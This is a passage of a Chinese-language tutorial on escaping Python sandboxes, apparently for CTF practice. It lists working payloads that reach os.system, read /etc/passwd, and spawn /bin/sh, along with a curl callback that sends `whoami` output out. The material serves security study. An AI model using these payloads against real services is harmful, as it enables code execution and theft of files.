class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#commands (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;commands&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;commands&quot;</span>].getoutput(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pty (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pty&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pty&quot;</span>].spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#importlib</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#imp</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pdb</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pdb&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pdb&quot;</span>].os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctypes</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># multiprocessing</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;multiprocessing&#x27;</span>).Process(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;curl localhost:9999/?a=`whoami`&#x27;</span>)).start()</span><br></pre></td></tr></table></figure><h5 id="FileRead"><a href="#FileRead" class="headerlink" title="FileRead"></a>FileRead</h5><p>操作文件可以使用 builtins 中的 open，也可以使用 FileLoader 模块的 get_data 方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;FileLoader&quot;</span> ][<span class="number">0</span>].get_data(<span class="number">0</span>,<span class="string">&quot;/etc/passwd&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="常见沙箱"><a href="#常见沙箱" class="headerlink" title="常见沙箱"></a>常见沙箱</h2><h3 id="exec-执行"><a href="#exec-执行" class="headerlink" title="exec 执行"></a>exec 执行</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="built_in">object</span>, <span class="built_in">globals</span>=<span class="literal">None</span>, <span class="built_in">locals</span>=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><ul><li><code>object</code><ul><li>要执行的代码字符串或代码对象。</li></ul></li><li><code>globals</code><ul><li>可选的全局命名空间字典。</li></ul></li><li><code>locals</code><ul><li>可选的局部命名空间字典。</li></ul></li></ul><h3 id="audit-hook-沙箱"><a href="#audit-hook-沙箱" class="headerlink" title="audit hook 沙箱"></a><code>audit hook</code> 沙箱</h3><p><code>audit hook</code> 是 Python 的一个安全机制，用于监控和限制代码的执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_hook</span>(<span class="params">event, args</span>):</span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;open&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Opening file: <span class="subst">&#123;args&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys.addaudithook(audit_hook)</span><br></pre></td></tr></table></figure><p>每次调用 <code>open</code> 函数时，都会触发 <code>audit_hook</code>，并触发相应事件。</p><h3 id="基于-AST-的沙箱"><a href="#基于-AST-的沙箱" class="headerlink" title="基于 AST 的沙箱"></a>基于 AST 的沙箱</h3><p>AST（抽象语法树）是 Python 的一种表示代码结构的方式。可以使用 AST 模块来分析和修改 Python 代码。</p><ul><li>ast.Module: 表示一个整个的模块或者脚本。</li><li>ast.FunctionDef: 表示一个函数定义。</li><li>ast.AsyncFunctionDef: 表示一个异步函数定义。</li><li>ast.ClassDef: 表示一个类定义。</li><li>ast.Return: 表示一个 return 语句。</li><li>ast.Delete: 表示一个 del 语句。</li><li>ast.Assign: 表示一个赋值语句。</li><li>ast.AugAssign: 表示一个增量赋值语句，如 x +&#x3D; 1。</li><li>ast.For: 表示一个 for 循环。</li><li>ast.While: 表示一个 while 循环。</li><li>ast.If: 表示一个 if 语句。</li><li>ast.With: 表示一个 with 语句。</li><li>ast.Raise: 表示一个 raise 语句。</li><li>ast.Try: 表示一个 try&#x2F;except 语句。</li><li>ast.Import: 表示一个 import 语句。</li><li>ast.ImportFrom: 表示一个 from…import…语句。</li><li>ast.Expr: 表示一个表达式。</li><li>ast.Call: 表示一个函数调用。</li><li>ast.Name: 表示一个变量名。</li><li>ast.Attribute: 表示一个属性引用，如 x.y。</li></ul><h3 id="基于-opcode-的沙箱"><a href="#基于-opcode-的沙箱" class="headerlink" title="基于 opcode 的沙箱"></a>基于 opcode 的沙箱</h3><h4 id="python-的字节码于与操作码"><a href="#python-的字节码于与操作码" class="headerlink" title="python 的字节码于与操作码"></a>python 的字节码于与操作码</h4><p>Python 是一种 解释型语言，这意味着 Python 代码在执行之前会被编译器编译为一种中间表示形式，称为 字节码（Bytecode）。字节码是一种低级的、与平台无关的表示形式，它是 Python 虚拟机（Python Virtual Machine, PVM）可以直接执行的指令集。</p><p>字节码由一条条操作码（Opcode）组成，每个操作码对应着 Python 语言中的一种操作。操作码是 Python 字节码的基本单位，它们定义了虚拟机应该执行的具体操作。</p><p>可以通过 dis.opname 和 dis.opmap 来查看所有可用的操作码及其对应关系：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印所有可用的操作码名称</span></span><br><span class="line"><span class="built_in">print</span>(dis.opname)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印某个特定操作符名称对应的 opcode 值</span></span><br><span class="line"><span class="built_in">print</span>(dis.opmap[<span class="string">&#x27;LOAD_CONST&#x27;</span>])  <span class="comment"># 输出: 100</span></span><br></pre></td></tr></table></figure><h2 id="逃逸目标"><a href="#逃逸目标" class="headerlink" title="逃逸目标"></a>逃逸目标</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="timeit"><a href="#timeit" class="headerlink" title="timeit"></a><code>timeit</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a><code>exec</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a><code>eval</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure><p>eval 无法直接达到执行多行代码的效果，使用 compile 函数并传入 exec 模式就能够实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">compile</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="platform"><a href="#platform" class="headerlink" title="platform"></a><code>platform</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.sys.modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">platform.os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="os"><a href="#os" class="headerlink" title="os"></a><code>os</code></h4><ul><li>os.system</li><li>os.popen</li><li>os.posix_spawn</li><li>os.exec*</li><li>os.spawnv</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">os.popen(<span class="string">&quot;ls&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">os.posix_spawn(<span class="string">&quot;/bin/ls&quot;</span>, [<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>], os.environ)</span><br><span class="line"></span><br><span class="line">os.posix_spawn(<span class="string">&quot;/bin/bash&quot;</span>, [<span class="string">&quot;/bin/bash&quot;</span>], os.environ)</span><br><span class="line"></span><br><span class="line">os.spawnv(<span class="number">0</span>,<span class="string">&quot;/bin/ls&quot;</span>, [<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>])</span><br></pre></td></tr></table></figure><p>os.exec*()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execl</span></span><br><span class="line">os.execl(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execl(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execle</span></span><br><span class="line">os.execle(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, os.environ)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execle(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execlp</span></span><br><span class="line">os.execlp(<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execle(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execlpe</span></span><br><span class="line">os.execlpe(<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, os.environ)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execlpe(<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execv</span></span><br><span class="line">os.execv(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>])</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execv(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execve</span></span><br><span class="line">os.execve(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>], os.environ)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execve(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>], <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execvp</span></span><br><span class="line">os.execvp(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>])</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execvp(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execvpe</span></span><br><span class="line">os.execvpe(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>], os.environ)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execvpe(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>], <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br></pre></td></tr></table></figure><p>os.fork() with os.exec*()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).fork() == <span class="number">0</span>) <span class="keyword">and</span> <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="subprocess"><a href="#subprocess" class="headerlink" title="subprocess"></a><code>subprocess</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;ls&#x27;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">subprocess.run(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>).Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h4 id="pty"><a href="#pty" class="headerlink" title="pty"></a><code>pty</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;pty&#x27;</span>).spawn(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure><p>Linux only</p><h4 id="importlib"><a href="#importlib" class="headerlink" title="importlib"></a><code>importlib</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;importlib&#x27;</span>).import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># Python3可以，Python2没有该函数</span></span><br><span class="line">importlib.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="sys"><a href="#sys" class="headerlink" title="sys"></a><code>sys</code></h4><p>该模块通过 modules() 函数获取 os 模块并执行命令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;calc&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="builtins-利用"><a href="#builtins-利用" class="headerlink" title="__builtins__ 利用"></a><code>__builtins__</code> 利用</h4><p>读取文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;builtins&quot;</span>).<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p>配合 <code>__import__</code> 可以实现动态导入模块并执行命令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)&gt;&gt;&gt; __builtins__.<span class="built_in">__import__</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p>由于每个导入的模块都会留存一个 <code>__builtins__</code> 属性，因此我们可以在任意的模块中通过 <code>__builtins__</code> 来引入模块或者执行文件操作。需要注意的是， <code>__builtins__</code> 在模块级别和全局级别的表现有所不同。</p><p>在全局级别（也就是你在 Python 交互式解释器中直接查看<code>__builtins__</code>时），<code>__builtins__</code>实际上是一个模块<code>&lt;module &#39;__builtin__&#39; (built-in)&gt;</code>。</p><p>在模块级别（也就是你在一个 Python 脚本中查看<code>__builtins__</code>），<code>__builtins__</code>是一个字典，这个字典包含了<code>__builtin__</code>模块中所有的函数和类。</p><p>因此，当通过其他模块的 <code>__builtins__</code>时，如<code>__import__(&#39;types&#39;).__builtins__</code>时，实际上看到的是一个字典，包含了所有的内建函数和类。此时调用的方式有所变化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>).__builtins__[<span class="string">&#x27;__import__&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="help-1"><a href="#help-1" class="headerlink" title="help"></a><code>help</code></h4><p>help 函数可以打开帮助文档. 索引到 os 模块之后可以打开 sh</p><p>在下面的环境</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="built_in">__import__</span>(<span class="string">&quot;re&quot;</span>).sub(<span class="string">r&#x27;[a-z0-9]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">input</span>(<span class="string">&quot;code &gt; &quot;</span>).lower()))[:<span class="number">130</span>])</span><br></pre></td></tr></table></figure><p>当我们输入 help 时，注意要进行 unicode 编码，help 函数会打开帮助文档。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>()</span><br></pre></td></tr></table></figure><p>输入 <code>os</code> , 会进入 <code>os</code> 的帮助文档</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>&gt; os</span><br></pre></td></tr></table></figure><p>然后在输入 !sh 就可以拿到 &#x2F;bin&#x2F;sh, 输入 !bash 则可以拿到 &#x2F;bin&#x2F;bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>&gt; os</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h4 id="breakpoint"><a href="#breakpoint" class="headerlink" title="breakpoint"></a><code>breakpoint</code></h4><p>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</p><p>在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;stdin&gt;(1)&lt;module&gt;()-&gt;None</span><br><span class="line">(Pdb) __import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br><span class="line">0</span><br><span class="line">(Pdb) __import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br></pre></td></tr></table></figure><h4 id="ctypes"><a href="#ctypes" class="headerlink" title="ctypes"></a><code>ctypes</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span 